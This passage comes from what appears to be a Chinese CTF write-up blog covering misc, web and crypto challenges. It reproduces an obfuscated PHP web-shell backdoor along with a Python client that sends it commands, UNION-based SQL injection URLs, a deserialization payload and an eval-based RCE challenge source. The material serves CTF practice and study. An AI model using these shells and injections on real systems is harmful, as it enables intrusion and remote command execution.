class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$kh</span> = <span class="string">&quot;3481&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;9d7b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$rr</span>);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span> = array_values(<span class="variable">$q</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$s</span> = &amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>;<span class="variable">$z</span> &lt; count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++) <span class="variable">$p</span>.= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="keyword">eval</span>(@gzuncompress(@x(base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(x(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>马子还臭还长，直接搜马子里关键代码，<code>https://www.jianshu.com/p/c8099299ac2a</code><br>当时看的不是这个师傅的文章，当时的找不到了，都一样，python一建利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span>(<span class="params">seq, amount</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt &lt; lenTxt <span class="keyword">and</span> iKey &lt; lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;3481&quot;</span>  <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;9d7b&quot;</span>  <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://42.192.64.28:8083/shell.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span>  <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages, <span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>, <span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload, xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url, headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>: acceptLangStr, <span class="string">&#x27;Referer&#x27;</span>: refe                                                                                   rer&#125;, proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey, xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output, xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>改掉中间的url和key就可以了，py2的<br><img src="/images/tjuctf/6.png" alt="image-20220124201741117"><br>直接打就行了，具体原因嘛，还需要继续研究研究</p><h5 id="这个doc不对劲"><a href="#这个doc不对劲" class="headerlink" title="这个doc不对劲"></a>这个doc不对劲</h5><p>这个题好玩，比较有趣，但是中间出现了一些意外，不过无伤大雅<br>下载附件，是个doc，显然60M+的doc不太现实，直接改成zip包<br>有一个key.txt，预览看不太正常，可能是0宽，网站打一下<br><img src="/images/tjuctf/7.png" alt="image-20220124202818555"><br>刚开始以为要掩码爆破，但是没跑出来，问了下出题人，题有些问题，直接给密码了解一下压缩包<br><code>Because I like naruto best</code><br>解一下压缩包，可以看到有许多图片，一共129488张，看小图片是两种不一样的图片，盲猜转01，八个为一位，转ascii转出来就可以了，人工肯定不现实，贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = 104329</span></span><br><span class="line"><span class="comment"># for i in range(300,400):</span></span><br><span class="line"><span class="comment">#     if int(i)*int(i)==a:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\tj\\tjtest.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130000</span>):</span><br><span class="line">    <span class="comment">#八个为一组八个后输出回车</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(i)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#读取所有文件夹下图片，根据getsize判断</span></span><br><span class="line">    a=os.path.getsize(<span class="string">&#x27;C:\\Users\\xin\\Desktop\\love\\out\\&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">262</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        fi.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tj\\tjtest.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        i = i.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是getsize是判断图片的字节<br><img src="/images/tjuctf/8.png" alt="image-20220124203834234"><br>运行出来，是base64图片，直接复制到浏览器就好了<br><img src="/images/tjuctf/9.png" alt="image-20220124204133045"><br><img src="/images/tjuctf/10.png" alt="image-20220125181954185"><br>输出的东西直接放到浏览器运行就可以了</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h5><p>sql注入没有任何过滤,直接打就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(schema_name),version(),version() from information_schema.schemata-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(table_name),version(),version() from information_schema.tables where table_schema=&#x27;CTF&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(column_name),version(),version() from information_schema.columns where table_schema=&#x27;CTF&#x27; and table_name=&#x27;flag&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),flag,null,null from CTF.flag-- -</span><br></pre></td></tr></table></figure><h5 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h5><p>文件上传，前端检测，先上传一个png图片抓包，然后改后缀，cat  /flag即可<br><img src="/images/tjuctf/11.png" alt="image-20220125194611835"></p><h5 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h5><p>ctfshow反序列化原题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>运行脚本,<img src="/images/tjuctf/12.png" alt="image-20220125195719749"><br>打一下就可以了,这里要注意一下url编码一下</p><h5 id="RCE-fun"><a href="#RCE-fun" class="headerlink" title="RCE_fun"></a>RCE_fun</h5><p>emmm  不会，后来看了下wp，emmm还可以这样  以为是原题，后面研究一下</p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h5 id="modulus"><a href="#modulus" class="headerlink" title="modulus"></a>modulus</h5><p>给了一个大n，e1和e2，c1，c2，共模攻击直接一把梭<br><img src="/images/tjuctf/13.png" alt="image-20220125200608676"></p><h4 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h4><p>emmmm 不能算做出来吧，直接软件一把梭的，<br><img src="/images/tjuctf/14.png" alt=" "></p><p><img src="/images/tjuctf/15.png" alt="image-20220125193800648"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>太菜了，cscms没做出来，中间搜了一个上传漏洞眉也没有打通，就没管了。<br>一直在路上</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫网络安全卫士守护赛</title>
      <link href="/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了源码，我们看到<code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; 